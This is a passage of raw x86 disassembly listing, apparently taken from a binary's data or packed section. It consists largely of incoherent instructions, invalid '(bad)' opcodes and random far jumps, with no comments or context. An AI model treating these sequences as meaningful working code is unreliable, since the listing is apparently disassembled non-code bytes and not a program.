  41cb62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cb63:	mov    bl,0x99
  41cb65:	fwait
  41cb66:	bound  ebx,QWORD PTR [esi]
  41cb68:	pop    es
  41cb69:	push   ds
  41cb6a:	aam    0x3
  41cb6c:	pop    esi
  41cb6d:	test   al,0x16
  41cb6f:	jbe    0x41caff
  41cb71:	and    DWORD PTR [ebx+0x5c],edx
  41cb74:	xchg   ebp,eax
  41cb75:	lds    edx,FWORD PTR [edx+0x734f7d8b]
  41cb7b:	in     eax,dx
  41cb7c:	jmp    0xbe4f79cd
  41cb81:	push   ebp
  41cb82:	retf   
  41cb83:	je     0x41cb12
  41cb85:	xor    eax,0x3c4f1ad6
  41cb8a:	cmp    al,0xfa
  41cb8c:	(bad)
  41cb8f:	ret    0x771c
  41cb92:	push   esi
  41cb93:	and    ah,bh
  41cb95:	repnz sbb al,0x10
  41cb98:	lods   eax,DWORD PTR ds:[esi]
  41cb99:	jp     0x41cb98
  41cb9b:	mov    fs,WORD PTR [edx+0x4]
  41cb9e:	push   0x53d5bf73
  41cba3:	ss jmp 0x9627:0xfbb556b7
  41cbab:	pushf  
  41cbac:	rol    DWORD PTR [ecx-0x329e081a],cl
  41cbb2:	push   esi
  41cbb3:	sub    al,dh
  41cbb5:	pop    ss
  41cbb6:	inc    edx
  41cbb7:	adc    esi,DWORD PTR [edx]
  41cbb9:	loop   0x41cc2c
  41cbbb:	jno    0x41cbd3
  41cbbd:	jno    0x41cb73
  41cbbf:	adc    bh,BYTE PTR es:[edi+0x14]
  41cbc3:	fidiv  DWORD PTR [edi+0x32]
  41cbc6:	mov    al,ds:0x694748c8
  41cbcb:	xlat   BYTE PTR ds:[ebx]
  41cbcc:	push   edx
  41cbcd:	inc    esp
  41cbce:	fidiv  WORD PTR [ebx]
  41cbd0:	cs adc al,0x38
  41cbd3:	push   ebx
  41cbd4:	es nop
  41cbd6:	jl     0x41cc24
  41cbd8:	mov    al,ds:0xa4c0eab0
  41cbdd:	stc    
  41cbde:	stos   BYTE PTR es:[edi],al
  41cbdf:	fcomp  QWORD PTR [si-0x1731]
  41cbe4:	out    0xf0,al
  41cbe6:	test   al,0x25
  41cbe8:	mov    cs,WORD PTR [ebp+0x15]
  41cbeb:	mov    esp,0xccb2d269
  41cbf0:	popa   
  41cbf1:	and    dh,BYTE PTR [ebx-0x25d1f333]
  41cbf7:	cmc    
  41cbf8:	fdivr  st(1),st
  41cbfa:	pop    ecx
  41cbfb:	xor    edi,edi
  41cbfd:	mov    ebx,0x34a0dbfc
  41cc02:	mov    esi,0x91bc5c8c
  41cc07:	cdq    
  41cc08:	mov    ds:0xf68ccccc,eax
  41cc0d:	pop    ebx
  41cc0e:	outs   dx,BYTE PTR ds:[esi]
  41cc0f:	sbb    BYTE PTR [eax+eax*8],al
  41cc12:	ja     0x41cc2e
  41cc14:	cdq    
  41cc15:	sbb    BYTE PTR [ebx],al
  41cc17:	test   eax,0xfeeac6f1
  41cc1c:	stos   DWORD PTR es:[edi],eax
  41cc1d:	out    0x22,eax
  41cc1f:	ins    BYTE PTR es:[edi],dx
  41cc20:	lods   al,BYTE PTR ds:[esi]
  41cc21:	mov    esp,0x29ade32e
  41cc26:	mov    dh,0x2
  41cc28:	mov    esp,0xaa8503cb
  41cc2d:	pop    eax
  41cc2e:	outs   dx,BYTE PTR ds:[esi]
  41cc2f:	jno    0x41cc4b
  41cc31:	mov    DWORD PTR [esi-0x1d343b8a],ebx
  41cc37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc38:	std    
  41cc39:	imul   ecx,DWORD PTR [eax],0xffffff88
  41cc3c:	(bad)  
  41cc3e:	jae    0x41cc05
  41cc40:	ret    
  41cc41:	lea    edi,[ebp-0x7c6e1f88]
  41cc47:	scas   al,BYTE PTR es:[edi]
  41cc48:	out    dx,eax
  41cc49:	scas   eax,DWORD PTR es:[edi]
  41cc4a:	jl     0x41cbf9
  41cc4c:	lods   eax,DWORD PTR ds:[si]
  41cc4e:	jnp    0x41cc17
  41cc50:	sbb    eax,0xf1e3284
  41cc55:	daa    
  41cc56:	dec    edx
  41cc57:	ja     0x41cc38
  41cc59:	push   ebx
  41cc5a:	jb     0x41cc5d
  41cc5c:	icebp  
  41cc5d:	into   
  41cc5e:	inc    esi
  41cc5f:	dec    ecx
  41cc60:	fmul   QWORD PTR [edi-0x7d08a3b0]
  41cc66:	pop    ds
  41cc67:	shl    BYTE PTR [esi+0x67ab40e7],cl
  41cc6d:	std    
  41cc6e:	mov    eax,0xcfb2e2a4
  41cc73:	and    DWORD PTR [ecx+0x43f6fba0],edx
  41cc79:	and    dh,BYTE PTR ds:0x92662eff
  41cc7f:	mov    al,ds:0x42b5801f
  41cc84:	push   edi
  41cc85:	mov    WORD PTR [ebx+edi*4-0x7c891c96],cs
  41cc8c:	inc    eax
  41cc8d:	and    DWORD PTR [ecx+0x2cfdfb36],edx
  41cc93:	cmp    dl,BYTE PTR [edi]
  41cc95:	and    eax,edi
  41cc97:	cmp    eax,0xab67610f
  41cc9c:	cmc    
  41cc9d:	mov    WORD PTR [esi+0x18450e9f],ss
  41cca3:	cli    
  41cca4:	cmp    ecx,DWORD PTR [esi-0x38]
  41cca7:	jg     0x41cca2
  41cca9:	add    bh,cl
  41ccab:	cwde   
  41ccac:	mov    esp,DWORD PTR [ebp+0x58445fe9]
  41ccb2:	repz mov edi,0x9d6af6c0
  41ccb8:	jmp    0x500dff8a
  41ccbd:	push   0x1d
  41ccbf:	imul   ecx,DWORD PTR [edi+esi*4],0x53769760
  41ccc6:	adc    eax,0xa119cfff
  41cccb:	or     edi,DWORD PTR [ebp+esi*1-0x7cd2ccc7]
  41ccd2:	or     edx,DWORD PTR [ebp-0x57]
  41ccd5:	or     al,BYTE PTR [esi-0x3a91e919]
  41ccdb:	or     ebp,esi
  41ccdd:	mov    edi,0xb9e3f79d
  41cce2:	and    DWORD PTR [esi+0x72f40906],0xffffffdf
  41cce9:	push   esp
  41ccea:	sbb    eax,0x50b2e83e
  41ccef:	cmp    ebx,DWORD PTR [ecx-0x2eedc48d]
  41ccf5:	xor    eax,0xa3100f54
  41ccfa:	bound  esp,QWORD PTR [edx]
  41ccfc:	dec    eax
  41ccfd:	adc    dl,bl
  41ccff:	sub    BYTE PTR [edi+0x2dbf5f0d],ah
  41cd05:	int    0xe
  41cd07:	lods   al,BYTE PTR ds:[esi]
  41cd08:	add    al,0x1f
  41cd0a:	je     0x41cd45
  41cd0c:	bound  eax,QWORD PTR [edi-0x1d9ecdcd]
  41cd12:	stos   DWORD PTR es:[edi],eax
  41cd13:	ins    BYTE PTR es:[edi],dx
  41cd14:	pushf  
  41cd15:	jnp    0x41ccc3
  41cd17:	das    
  41cd18:	sub    BYTE PTR [eax+0x1e9c67a6],bh
  41cd1e:	ror    DWORD PTR [ebx-0x1d],0x35
  41cd22:	sub    DWORD PTR [ecx+0x461b96a7],edx
  41cd28:	sbb    BYTE PTR [esi],ch
  41cd2a:	cdq    
  41cd2b:	(bad)  
  41cd2c:	outs   dx,BYTE PTR ds:[esi]
  41cd2d:	sub    al,0x3
  41cd2f:	jns    0x41cd1a
  41cd31:	(bad)  
  41cd32:	hlt    
  41cd33:	sbb    BYTE PTR [edx-0x587d182c],dh
  41cd39:	test   DWORD PTR [eax+0x6831dff5],ecx
  41cd3f:	dec    ecx
  41cd40:	fucomi st,st(0)
  41cd42:	inc    edi
  41cd43:	iret   
  41cd44:	int3   
  41cd45:	dec    esp
  41cd46:	ds push edi
  41cd48:	leave  
  41cd49:	std    
  41cd4a:	mov    ds:0x2f4a499a,al
  41cd4f:	pushw  0xffc0
  41cd52:	rol    DWORD PTR [ecx],0x92
  41cd55:	sbb    cl,cl
  41cd57:	loope  0x41ccf9
  41cd59:	loop   0x41cdd1
  41cd5b:	es pop ebx
  41cd5d:	popa   
  41cd5e:	test   eax,0x12434fdb
  41cd63:	add    eax,0xbc185ea0
  41cd68:	cld    
  41cd69:	icebp  
  41cd6a:	cdq    
  41cd6b:	push   eax
  41cd6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd6d:	push   ecx
  41cd6e:	std    
  41cd6f:	sbb    al,0x14
  41cd71:	jmp    0xe34f:0x9a91aacf
  41cd78:	and    dh,bh
  41cd7a:	mov    esp,0xa6fd938e
  41cd7f:	mov    al,0xb6
  41cd81:	mov    dl,BYTE PTR [edx-0x199a9004]
  41cd87:	ss or  eax,0x5c204948
  41cd8d:	xor    eax,0x67a90a29
  41cd92:	mov    ds:0x774a67ff,al
  41cd97:	ss xchg ecx,eax
  41cd99:	stc    
  41cd9a:	sub    eax,0x8bf05050
  41cd9f:	xchg   esi,eax
  41cda0:	sub    al,0x6f
  41cda2:	out    dx,eax
  41cda3:	sbb    DWORD PTR ds:0xa3c9e7a2,0x9594e49c
  41cdad:	mov    bh,0x5b
  41cdaf:	cmp    al,0x91
  41cdb1:	inc    esp
  41cdb2:	jmp    0x41cd75
  41cdb4:	fsub   QWORD PTR [edi+0x535e2f1]
  41cdba:	sar    ch,0x83
  41cdbd:	mov    al,ds:0xe05ae921
  41cdc2:	pop    ebp
  41cdc3:	xchg   edi,eax
  41cdc5:	popa   
  41cdc6:	cmp    esi,edx
  41cdc8:	pop    ebp
  41cdc9:	push   0x9905f801
  41cdce:	fldcw  WORD PTR [ecx+0x2b9c495]
  41cdd4:	adc    ch,BYTE PTR [edi+0x62e2e811]
  41cdda:	cmp    dh,BYTE PTR ds:0x7e5be577
  41cde0:	or     al,0x50
  41cde2:	jp     0x41cdfa
  41cde4:	and    esi,0xb958b1a6
  41cdea:	rep lods eax,DWORD PTR ds:[esi]
  41cdec:	loop   0x41cd7a
  41cdee:	mov    eax,0x66462e90
  41cdf3:	ins    BYTE PTR es:[edi],dx
  41cdf4:	cmp    dl,ch
  41cdf6:	test   BYTE PTR [eax+0x476fec47],al
  41cdfc:	daa    
  41cdfd:	pop    ds
  41cdfe:	xchg   BYTE PTR [edx],ch
  41ce00:	fs mov edi,0xa71d67a2
  41ce06:	mov    esi,0xd3fb4eff
  41ce0b:	jmp    DWORD PTR [edx]
  41ce0d:	cli    
  41ce0e:	ror    DWORD PTR [ecx+0x3e],1
  41ce11:	jg     0x41ce84
  41ce13:	adc    BYTE PTR [edx],bh
  41ce15:	and    ecx,DWORD PTR [esi+edx*8-0x66eedee1]
  41ce1c:	lods   al,BYTE PTR ds:[esi]
  41ce1d:	lea    eax,[edx]
  41ce1f:	lds    ecx,FWORD PTR [esi]
  41ce21:	sub    ecx,DWORD PTR [esp+eiz*8-0x22]
  41ce25:	gs aam 0x91
  41ce28:	cmp    BYTE PTR [ecx+eiz*1],cl
  41ce2b:	aam    0x2f
  41ce2d:	sub    DWORD PTR [ebx+eax*8],ebp
  41ce30:	ds es push 0x7e3d8bca
  41ce37:	es mov al,0xac
  41ce3a:	cmp    BYTE PTR [esi-0x38bcd11],0x5f
  41ce41:	pop    ebx
  41ce42:	(bad)  [ebx]
  41ce44:	mov    al,ds:0x62b1f28b
  41ce49:	xchg   esp,eax
  41ce4a:	mov    ah,0xe7
  41ce4c:	mov    ah,0x43
  41ce4e:	(bad)  
  41ce4f:	call   0x290aa061
  41ce54:	ja     0x41ce94
  41ce56:	inc    ecx
  41ce57:	xchg   edx,eax
  41ce58:	xchg   edx,eax
  41ce59:	mov    bl,0xa8
  41ce5b:	fdiv   st(7),st
  41ce5d:	dec    ebp
  41ce5e:	cmp    al,BYTE PTR es:[ebx+eiz*2+0x237645ed]
  41ce66:	sbb    DWORD PTR ds:[edx-0x7],ebp
  41ce6a:	inc    esi
  41ce6b:	popa   
  41ce6c:	and    eax,0x9096774b
  41ce71:	hlt    
  41ce72:	(bad)  
  41ce73:	push   ss
  41ce74:	and    edi,DWORD PTR [ecx+ecx*8-0x2fae9881]
  41ce7b:	add    al,0xc8
  41ce7d:	and    BYTE PTR [ebx-0x387198f8],0x2f
  41ce84:	cmp    ebp,DWORD PTR cs:[ebx]
  41ce87:	hlt    
  41ce88:	mov    dh,0xa2
  41ce8a:	pop    edx
  41ce8b:	jle    0x41cef1
  41ce8d:	push   0xe
  41ce8f:	sti    
  41ce90:	fsubr  st(7),st
  41ce92:	sub    ebx,esi
  41ce94:	mov    bh,0x25
  41ce96:	push   eax
  41ce97:	cdq    
  41ce98:	shr    DWORD PTR [ebx+0x32],0x31
  41ce9c:	push   ebx
  41ce9d:	dec    edx
  41ce9e:	aaa    
  41ce9f:	fucomp st(5)
  41cea1:	mov    ch,0x2c
  41cea3:	in     eax,dx
  41cea4:	dec    ebp
  41cea5:	punpckhwd mm3,QWORD PTR [edx]
  41cea8:	in     al,dx
  41cea9:	hlt    
  41ceaa:	(bad)  
  41ceab:	in     al,dx
  41ceac:	iret   
  41cead:	lds    ecx,FWORD PTR gs:[ebp-0x4fe46805]
  41ceb4:	nop
  41ceb5:	mov    ds:0x97f08c39,eax
  41ceba:	rcr    BYTE PTR [edi],0x71
  41cebd:	(bad)  
  41cebe:	scas   eax,DWORD PTR es:[edi]
  41cebf:	sahf   
  41cec0:	hlt    
  41cec1:	adc    DWORD PTR [ebp-0x1cc72768],ecx
  41cec7:	push   ecx
  41cec8:	push   esi
  41cec9:	lahf   
  41ceca:	sar    DWORD PTR [ebx-0x29],1
  41cecd:	cmp    eax,DWORD PTR [ecx+0x1d]
  41ced0:	cmp    edi,DWORD PTR [ecx-0x67]
  41ced3:	(bad)  
  41ced4:	mov    eax,ds:0xf4f34c35
  41ced9:	cmp    DWORD PTR [esi],0x4d
  41cedc:	fst    QWORD PTR [edi-0x64]
  41cedf:	das    
  41cee0:	dec    edi
  41cee1:	iret   
  41cee2:	(bad)  
  41cee4:	and    al,bh
  41cee6:	and    cl,ch
  41cee8:	stos   DWORD PTR es:[edi],eax
  41cee9:	push   es
  41ceea:	sub    DWORD PTR ds:0xf72926f6,esp
  41cef0:	je     0x41ce97
  41cef2:	cmp    BYTE PTR [edx],dh
  41cef4:	push   eax
  41cef5:	push   ebp
  41cef6:	mov    eax,ds:0xec5fa875
  41cefb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cefc:	ds pop ss
  41cefe:	or     BYTE PTR [edx],dh
  41cf00:	inc    esi
  41cf01:	call   0x4ca1:0xc27a0d75
  41cf08:	shl    BYTE PTR [edi+eax*1],1
  41cf0b:	loope  0x41ce91
  41cf0d:	adc    eax,0xdd4cfa29
  41cf12:	push   ebp
  41cf13:	retf   0x4c81
  41cf16:	shl    DWORD PTR [edx-0x54cca7cf],cl
  41cf1c:	jmp    0x2fce193c
  41cf21:	or     al,0x23
  41cf23:	xor    eax,0x4233935a
  41cf28:	test   eax,0x33834ff0
  41cf2d:	imul   esp,DWORD PTR [edi],0x94298abf
  41cf33:	cli    
  41cf34:	ss loopne 0x41cfa9
  41cf37:	ror    BYTE PTR [edi+0x5a],1
  41cf3a:	adc    dh,ch
  41cf3c:	xor    ebx,DWORD PTR [edi+0x1a]
  41cf3f:	jno    0x41cf3e
  41cf41:	mov    cl,0x68
  41cf43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cf44:	scas   al,BYTE PTR es:[edi]
  41cf45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cf46:	and    ah,BYTE PTR [ebx+0x35]
  41cf49:	je     0x41cee1
  41cf4b:	cld    
  41cf4c:	inc    eax
  41cf4d:	pop    esi
  41cf4e:	shufps xmm3,xmm2,0x7
  41cf52:	fadd   QWORD PTR [ecx+0x48]
  41cf55:	xchg   bl,cl
  41cf57:	outs   dx,BYTE PTR ds:[esi]
  41cf58:	sub    DWORD PTR [ebx-0x7b9fd90a],edi
  41cf5e:	xchg   BYTE PTR [ebp-0x35],cl
  41cf61:	(bad)  
  41cf62:	out    dx,al
  41cf63:	pushf  
  41cf64:	rcr    DWORD PTR [ebp-0x33fd9af2],cl
  41cf6a:	(bad)  
  41cf6b:	in     al,dx
  41cf6c:	outs   dx,DWORD PTR ds:[esi]
  41cf6d:	call   0x54b7:0x927d6a55
  41cf74:	sub    BYTE PTR [ecx+0x6e7d0e22],0x6c
  41cf7b:	xchg   ecx,eax
  41cf7c:	adc    ah,dh
  41cf7e:	loopne 0x41cf7d
  41cf80:	ds xchg sp,ax
  41cf83:	or     al,0x65
  41cf85:	shr    eax,0x1f
  41cf88:	fisub  WORD PTR [edi-0xf94c8fa]
  41cf8e:	jo     0x41cf60
  41cf90:	aad    0xfc
  41cf92:	xor    DWORD PTR [edx-0x762f89b6],0x26d1a3a8
  41cf9c:	out    0x80,eax
  41cf9e:	add    ch,BYTE PTR [ebp+0x20fb4771]
  41cfa4:	mov    WORD PTR ds:0x94e2f062,ds
  41cfaa:	xchg   BYTE PTR [ebx],ah
  41cfac:	fs jp  0x41cf5d
  41cfaf:	jl     0x41cf83
  41cfb1:	push   ebx
  41cfb2:	pop    ebp
  41cfb3:	ins    BYTE PTR es:[edi],dx
  41cfb4:	in     al,dx
  41cfb5:	jmp    0xa510a45d
  41cfba:	or     eax,0x96aa2575
  41cfbf:	or     al,0x89
  41cfc1:	mov    dl,BYTE PTR [edx+0x29]
  41cfc4:	mov    cl,0xab
  41cfc6:	in     ax,0xde
  41cfc9:	int    0xa9
  41cfcb:	xor    ebp,DWORD PTR ds:[ecx]
  41cfce:	popa   
  41cfcf:	dec    cl
  41cfd1:	jecxz  0x41cfba
  41cfd3:	fcmovbe st,st(6)
  41cfd5:	cwde   
  41cfd6:	fnsave [esi+0x6987c5cf]
  41cfdc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cfdd:	aam    0x71
  41cfdf:	push   ecx
  41cfe0:	add    al,0xc3
  41cfe2:	stos   BYTE PTR es:[edi],al
  41cfe3:	mov    ah,0xfe
  41cfe5:	ds push edi
  41cfe7:	mov    eax,0x8869392e
  41cfec:	mov    ah,0x7f
  41cfee:	jmp    0x925d:0xba175271
  41cff5:	dec    eax
  41cff6:	jmp    0xf86a5322
  41cffb:	xchg   BYTE PTR [edx-0x1a],bl
  41cffe:	sar    DWORD PTR [ebx-0x2],1
  41d001:	push   ss
  41d002:	scas   al,BYTE PTR es:[edi]
  41d003:	cmp    al,0x7
  41d005:	or     al,0x45
  41d007:	enter  0xac49,0x1
  41d00b:	push   eax
  41d00c:	or     eax,0xf0097130
  41d011:	xchg   ecx,eax
  41d012:	and    bl,ch
  41d014:	imul   ebx,DWORD PTR [eax+0x286cba94],0x17
  41d01b:	push   ebp
  41d01c:	inc    esi
  41d01d:	mov    al,fs:0xed3940e4
  41d023:	retf   
  41d024:	push   ecx
  41d025:	call   0x41153dff
  41d02a:	and    ecx,DWORD PTR [eax-0x3295c54d]
  41d030:	xchg   ebx,eax
  41d031:	(bad)  [ebx-0x21c06e6e]
  41d037:	xchg   esi,eax
  41d038:	pop    edx
  41d039:	xchg   DWORD PTR [edi+0x21],esi
  41d03c:	out    dx,al
  41d03d:	pop    ss
  41d03e:	sahf   
  41d03f:	icebp  
  41d040:	(bad)
  41d044:	lods   al,BYTE PTR ds:[esi]
  41d045:	aad    0x7c
  41d047:	push   es
  41d048:	inc    ebx
  41d049:	lods   al,BYTE PTR ds:[esi]
  41d04a:	sub    BYTE PTR [edx+0x3e3aca47],0x45
  41d051:	jns    0x41d033
  41d053:	mov    esp,DWORD PTR [esp+eiz*8-0x5d]
  41d057:	pop    esp
  41d058:	add    eax,0x37334766
  41d05d:	clc    
  41d05e:	mov    ebp,0x5d916e17
  41d063:	sub    eax,0x504d2c2a
  41d068:	(bad)  
  41d069:	mov    dh,0x18
  41d06b:	loop   0x41d0a0
  41d06d:	fbstp  TBYTE PTR [ebp-0xd]
  41d070:	adc    eax,0x67c6463e
  41d075:	pop    esi
  41d076:	jmp    0x97d8:0xc8283f59
  41d07d:	push   ds
  41d07e:	jb     0x41d0e9
  41d080:	das    
  41d081:	lahf   
  41d082:	jbe    0x41d064
  41d084:	js     0x41d040
  41d086:	sbb    ch,BYTE PTR [esi-0x2e05b66b]
  41d08c:	mov    ds:0x2d6e06bf,al
  41d091:	leave  
  41d092:	mov    edi,0x78b5f2de
  41d097:	push   ebx
  41d098:	out    0xce,eax
  41d09a:	add    BYTE PTR [ebx-0x4c36eb2a],0x35
  41d0a1:	fwait
  41d0a2:	sub    BYTE PTR [eax+0x168c299a],al
  41d0a8:	jge    0x41d0db
  41d0aa:	jp     0x41d0a5
  41d0ac:	scas   al,BYTE PTR es:[edi]
  41d0ad:	push   ecx
  41d0ae:	pop    ebp
  41d0af:	dec    edi
  41d0b0:	dec    ecx
  41d0b1:	mov    ebp,0xc21a502d
  41d0b6:	adc    BYTE PTR [ebx+0x20e463be],bh
  41d0bc:	jb     0x41d0fb
  41d0be:	jo     0x41d134
  41d0c0:	pop    ebp
  41d0c1:	push   eax
  41d0c2:	fwait
  41d0c3:	mov    dh,0xc6
  41d0c5:	loop   0x41d0e6
  41d0c7:	mov    esi,0x7f786c02
  41d0cc:	fisub  DWORD PTR [eax]
  41d0ce:	mov    dl,0xb6
  41d0d0:	sbb    BYTE PTR [edx],bl
  41d0d2:	cmp    bh,al
  41d0d4:	outs   dx,DWORD PTR ds:[esi]
  41d0d5:	mov    eax,ds:0x4a9859ee
  41d0da:	lock fistp DWORD PTR [ebx]
  41d0dd:	push   0x3d107106
  41d0e2:	out    dx,al
  41d0e3:	loop   0x41d111
  41d0e5:	sub    ah,BYTE PTR [ebp-0x27b4060d]
  41d0eb:	xor    ch,BYTE PTR [esi-0x2c60512a]
  41d0f1:	icebp  
  41d0f2:	lea    eax,[edi+eiz*2+0x6f1487fe]
  41d0f9:	daa    
  41d0fa:	cmp    al,0xc3
  41d0fc:	xchg   esp,eax
  41d0fd:	xor    eax,0xca37de65
  41d102:	mov    bh,0x7c
  41d104:	ror    edx,1
  41d106:	sub    ebp,edx
  41d108:	sar    ebp,0xb8
  41d10b:	sbb    eax,esp
  41d10d:	shr    DWORD PTR [ebp-0x434488ea],0x79
  41d114:	gs cs lock (bad) 
  41d118:	pop    eax
  41d119:	es pop ss
  41d11b:	ror    bl,cl
  41d11d:	data16 add dl,BYTE PTR [esi]
  41d120:	div    DWORD PTR [edi-0x76104b92]
  41d126:	cmp    BYTE PTR [eax-0x5a],dh
  41d129:	setne  al
  41d12c:	rcr    dh,1
  41d12e:	fsubr  QWORD PTR [ebx-0x11]
  41d131:	add    DWORD PTR [ecx+ebx*1-0x1f],0x2e319569
  41d139:	fs xchg edx,eax
  41d13b:	cmp    DWORD PTR [esi],ecx
  41d13d:	mov    ebp,0xe957d409
  41d142:	push   eax
  41d143:	mov    ?,WORD PTR [edx-0x29]
  41d146:	sub    ebx,DWORD PTR [ebx+edi*4-0x50]
  41d14a:	mov    esp,DWORD PTR [esi+0x5d]
  41d14d:	mov    DWORD PTR [ecx-0x10309623],0x1f4ab637
  41d157:	push   esp
  41d158:	push   0xd7f98985
  41d15d:	mov    bl,0x7d
  41d15f:	xor    ebp,DWORD PTR [esi-0x5fcf1b2f]
  41d165:	fcmovbe st,st(4)
  41d167:	sub    bh,al
  41d169:	mov    esp,esi
  41d16b:	popa   
  41d16c:	jg     0x41d12b
  41d16e:	out    dx,al
  41d16f:	fild   QWORD PTR [ebx+0x5576c849]
  41d175:	xlat   BYTE PTR ds:[ebx]
  41d176:	out    dx,al
  41d177:	paddusb mm3,QWORD PTR [ebx-0x7d]
  41d17b:	push   edi
  41d17c:	out    0x3e,al
  41d17e:	push   eax
  41d17f:	std    
  41d180:	shl    BYTE PTR [ebp+edx*1+0xbdbc123],0xcd
  41d188:	add    ah,al
  41d18a:	stc    
  41d18b:	xchg   edi,eax
  41d18c:	das    
  41d18d:	and    DWORD PTR [edx+0x76f885d3],edx
  41d193:	call   0xed8:0x4cb5dd17
  41d19a:	js     0x41d1b4
  41d19c:	ins    DWORD PTR es:[edi],dx
  41d19d:	mov    ah,0xc7
  41d19f:	fwait
  41d1a0:	add    DWORD PTR [ebx-0x1b],esi
  41d1a3:	lds    ecx,FWORD PTR [edx+0x454ea739]
  41d1a9:	sbb    BYTE PTR [ebp-0x75],0xec
  41d1ad:	jb     0x41d1a8
  41d1af:	or     dh,0x98
  41d1b2:	pop    ebp
  41d1b3:	push   0xffffffd9
  41d1b5:	call   0xd11e5cac
  41d1ba:	call   0x541d88ee
  41d1bf:	in     al,0xc6
  41d1c1:	inc    esi
  41d1c2:	lds    esp,FWORD PTR [ebp+0x6f2ab97b]
  41d1c8:	lea    ecx,[edi+0x78]
  41d1cb:	push   ebx
  41d1cc:	jae    0x41d1ba
  41d1ce:	jl     0x41d224
  41d1d0:	les    eax,FWORD PTR [esi+0x1ef646a6]
  41d1d6:	(bad)  
  41d1d7:	jbe    0x41d1db
  41d1d9:	adc    DWORD PTR cs:[ebp-0x8400aeb],edi
  41d1e0:	stos   DWORD PTR es:[edi],eax
  41d1e1:	dec    ebx
  41d1e2:	ins    DWORD PTR es:[edi],dx
  41d1e3:	xlat   BYTE PTR ds:[ebx]
  41d1e4:	dec    ebx
  41d1e5:	fnsave es:[edx-0x45a3553e]
  41d1ec:	jbe    0x41d182
  41d1ee:	push   esi
  41d1ef:	je     0x41d249
  41d1f1:	jnp    0x41d17f
  41d1f3:	out    dx,al
  41d1f4:	lock fcmovnb st,st(4)
  41d1f7:	std    
  41d1f8:	pop    edx
  41d1f9:	push   edi
  41d1fa:	inc    esi
  41d1fb:	adc    eax,0xd43f12f0
  41d200:	stos   DWORD PTR es:[edi],eax
  41d201:	arpl   WORD PTR es:[eax],dx
  41d204:	xchg   ebp,eax
  41d205:	add    DWORD PTR [edx+0x59],eax
  41d208:	mov    cl,0xf3
  41d20a:	push   0xffffffbf
  41d20c:	mov    cl,0xff
  41d20e:	cs sahf 
  41d210:	or     eax,DWORD PTR ds:0x3558dcbe
  41d216:	jp     0x41d23a
  41d218:	int3   
  41d219:	inc    edx
  41d21a:	jl     0x41d276
  41d21c:	rol    ah,0x9b
  41d21f:	fsub   st(3),st
  41d221:	out    dx,eax
  41d222:	adc    eax,0x70926ca3
  41d227:	mov    ecx,0xea932882
  41d22c:	add    edi,esp
  41d22e:	fild   DWORD PTR [edx]
  41d230:	jbe    0x41d262
  41d232:	inc    edx
  41d233:	push   ebx
  41d234:	xchg   esp,eax
  41d235:	push   0x97682778
  41d23a:	adc    DWORD PTR [ecx-0x1eb572e],edi
  41d240:	dec    esp
  41d241:	xor    al,0x18
  41d243:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d244:	outs   dx,BYTE PTR ds:[esi]
  41d245:	gs pop ebx
  41d247:	loopne 0x41d236
  41d249:	jmp    0x532b:0xe02069de
  41d250:	and    DWORD PTR [edi],ebx
  41d252:	in     eax,dx
  41d253:	addr16 dec esp
  41d255:	push   ecx
  41d256:	jg     0x41d1de
  41d258:	push   es
  41d259:	jno    0x41d215
  41d25b:	add    ecx,esi
  41d25d:	cli    
  41d25e:	inc    edx
  41d25f:	sub    al,0x5c
  41d261:	in     eax,dx
  41d262:	sbb    eax,0xdaa6ebae
  41d267:	inc    edx
  41d268:	pop    edi
  41d269:	mov    edx,0xf270c220
  41d26e:	popf   
  41d26f:	fs xchg edi,eax
  41d271:	xchg   edi,eax
  41d272:	dec    edi
  41d273:	pop    esi
  41d274:	shr    ebp,cl
  41d276:	test   al,0x7
  41d278:	stos   BYTE PTR es:[edi],al
  41d279:	imul   esp,DWORD PTR [edi+0x185cfacc],0x59d58334
  41d283:	fsubrp st(4),st
  41d285:	and    al,0x4e
  41d287:	pop    ss
  41d288:	xor    dl,BYTE PTR [eax-0x54]
  41d28b:	adc    bl,cl
  41d28d:	test   eax,0xa7bfd5f5
  41d292:	sbb    ebp,ebp
  41d294:	adc    DWORD PTR [eax-0xd],ecx
  41d297:	pop    ebx
  41d298:	push   0xa5f33c08
  41d29d:	xchg   edx,eax
  41d29e:	dec    ebp
  41d29f:	jle    0x41d28d
  41d2a1:	lea    edi,[eax-0x1b]
  41d2a4:	shl    BYTE PTR [ecx],cl
  41d2a6:	jle    0x41d22b
  41d2a8:	push   cs
  41d2a9:	and    ebp,edx
  41d2ab:	aas    
  41d2ac:	(bad)  
  41d2ad:	cdq    
  41d2ae:	fsubp  st(0),st
  41d2b0:	(bad)
  41d2b3:	mov    eax,0x18ed6fe3
  41d2b8:	mov    ah,0xef
  41d2ba:	fadd   QWORD PTR [ebx+0x70bb73a9]
  41d2c0:	arpl   WORD PTR [ecx+0x7115d060],bp
  41d2c6:	call   0x6e3de099
  41d2cb:	nop
  41d2cc:	jne    0x41d288
  41d2ce:	imul   edi,DWORD PTR [ebx+0x5c],0x11
  41d2d2:	cmp    DWORD PTR [esi+0x6425f606],edi
  41d2d8:	xchg   edi,eax
  41d2d9:	hlt    
  41d2da:	dec    ebx
  41d2db:	xchg   ebp,eax
  41d2dc:	ret    
  41d2dd:	ret    0x40a5
  41d2e0:	sub    BYTE PTR [edx+0x40a0cad1],al
  41d2e6:	fs dec edx
  41d2e8:	push   ebp
  41d2e9:	jnp    0x41d282
  41d2eb:	sub    DWORD PTR [ebx+0x2180a232],edi
  41d2f1:	rol    bh,cl
  41d2f3:	xor    al,BYTE PTR [esi]
  41d2f5:	push   ebp
  41d2f6:	out    dx,al
  41d2f7:	push   ss
  41d2f8:	inc    edx
  41d2f9:	aad    0xfb
  41d2fb:	pusha  
  41d2fc:	jmp    0x2425f2a8
  41d301:	or     esp,DWORD PTR [ecx+0x45]
  41d304:	call   0x2326:0x63763baf
  41d30b:	not    BYTE PTR [ecx]
  41d30d:	imul   esp
  41d30f:	es call 0x627546d8
  41d315:	(bad)  [ecx+0x19]
  41d318:	xchg   edx,eax
  41d319:	push   edx
